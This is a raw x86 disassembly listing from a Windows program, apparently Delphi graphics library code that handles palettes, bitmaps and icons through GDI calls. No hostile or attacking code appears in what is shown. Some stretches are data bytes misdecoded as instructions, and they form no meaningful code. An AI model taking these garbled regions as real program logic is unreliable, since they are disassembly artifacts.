mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41e58c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41e612
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41e624
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028b8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41e41c
mov eax esp
call sub_41e58c
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41e6c8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41e41c
mov [ esp ] eax
sub_41e71c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41e0c4
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41e0a4
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_41e8c8
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41df34
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e7ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41df44
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e7f5
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41de38
sub_41e7f5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41e0c4
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41df34
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e8a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_41df44
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e8af
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41e8e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41e974
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_4079a4
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_41ec6b
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_41ea5d
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41de38
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea64
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41ea64
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41e8d8
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_4079a4
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_41ec4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41e71c
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_4079a4
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_41ec28
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec2f
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026dc
retn
call sub_41de8c
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41e8d8
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41e8e4
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41ec94
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41de14
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b18
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41e0c4
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41ed78
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41ec94
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_41ede4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41ec94
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41ee81
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee88
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_41eeb8
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402b18
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402b18
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_41eeac
xor edx edx
push ebp
push sub_41f0a6
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41ed78
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41ed78
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41f07f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_4079a4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_4079a4
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_4079a4
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_4079a4
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_41ede4
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_41ede4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f086
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026dc
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026dc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026dc
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41f086
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f0ad
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_41f0b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030d4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_41f104
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_41f15c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_41f104
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f1a5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40304c
mov edi eax
mov eax esi
call sub_40304c
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f2df
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f2c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407ad0
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f2c9
mov al 0x1
sub_41f2f8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415e78
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f340
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f347
mov eax [ ebp - 0x4 ]
call sub_403104
retn
sub_41f34c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41f380
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415e78
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f3cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f3d2
mov eax [ ebp - 0x4 ]
call sub_403104
retn
sub_41f3fc
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
jl r-xdata
popad
je r-xdata
inc ecx
add [ edi + edi * 8 + 0x30 ] ah
inc ecx
add [ esp + edi + 0x41 ] al
add al al
cmp al 0x41
add [ eax ] dl
push esp
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
jo r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
xchg esp eax
mov edx r-xdata
mov eax esi
call sub_41f614
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_41f614
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_41f614
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f578
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403e78
retn
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x100041f4 ] al
add [ eax ] al
add [ eax + 0x19 ] bl
inc ecx
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add al cl
cmc
inc ecx
add [ ebp + edi + 0x3f7c0041 ] dl
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4030d4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_41f614
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x8 ]
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41f571
push [ fs : eax ]
add esp 0xfffffff0
call sub_403428
sub_41f494
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41f571
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
